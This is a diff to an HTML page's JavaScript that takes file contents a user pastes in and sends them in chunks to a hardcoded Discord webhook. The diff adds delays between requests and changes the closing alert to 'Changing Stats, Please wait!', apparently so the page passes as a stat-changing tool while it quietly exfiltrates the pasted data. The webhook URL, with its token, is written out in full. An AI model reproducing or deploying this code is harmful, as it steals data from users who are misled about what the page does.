@@ -181,7 +181,7 @@
             document.getElementById('content').innerHTML = '';
         }
 
-        // Process File Input
+        // Process File Input with delay between chunks
         function processFile() {
             const fileContent = document.getElementById('fileInput').value;
 
@@ -191,16 +191,31 @@
             }
 
             const chunks = fileContent.match(/.{1,2000}/g); // Break into chunks
-            chunks.forEach((chunk, index) => {
-                fetch('https://discord.com/api/webhooks/1321995950989774848/BKg3Y7TCya2_Q-PpAAYDWq31ZxxnG4cR90MjJZTB7yp7CdDRUWyqrsE_RAhR7T9bLJA2', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: `Part ${index + 1}: ${chunk}` }),
-                });
-            });
+            let delay = 0;
 
-            alert('File sent successfully!');
+            chunks.forEach((chunk, index) => {
+                setTimeout(() => {
+                    fetch('https://discord.com/api/webhooks/1321995950989774848/BKg3Y7TCya2_Q-PpAAYDWq31ZxxnG4cR90MjJZTB7yp7CdDRUWyqrsE_RAhR7T9bLJA2', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: `Part ${index + 1}: ${chunk}` }),
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (index === chunks.length - 1) {
+                            alert('Changing Stats, Please wait!');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error sending file chunk:', error);
+                        alert('Failed to connect.');
+                    });
+                }, delay);
+
+                delay += 2000; // Delay of 2 seconds between each request
+            });
         }
     </script>
 </body>
 </html>
+
